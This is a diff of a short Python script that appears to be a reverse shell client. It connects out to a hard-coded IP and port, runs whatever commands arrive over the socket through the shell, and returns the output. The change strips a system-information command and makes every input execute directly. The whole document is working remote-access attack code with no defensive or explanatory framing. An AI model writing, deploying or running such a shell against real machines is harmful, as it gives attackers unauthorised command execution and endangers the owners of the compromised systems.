@@ -1,16 +1,15 @@
 import socket
 import subprocess
-import platform
 
-SERVER_IP = "10.1.12.137"   # Your IP
+SERVER_IP = "10.1.12.137"
 PORT = 54321
 
 def run_cmd(cmd):
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
         return output
-    except subprocess.CalledProcessError as e:
-        return e.output
+    except:
+        return b"Command failed\n"
 
 def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -26,18 +25,12 @@ def main():
         if cmd == "exit":
             break
 
-        elif cmd == "sysinfo":
-            info = (
-                "System  : " + platform.system() + "\n" +
-                "Node    : " + platform.node() + "\n" +
-                "Release : " + platform.release() + "\n" +
-                "Machine : " + platform.machine() + "\n"
-            )
-            s.send(info.encode())
+        output = run_cmd(cmd)
 
-        else:
-            result = run_cmd(cmd)
-            s.send(result)
+        if not output:
+            output = b"[No output]\n"
+
+        s.send(output)
 
     s.close()
 
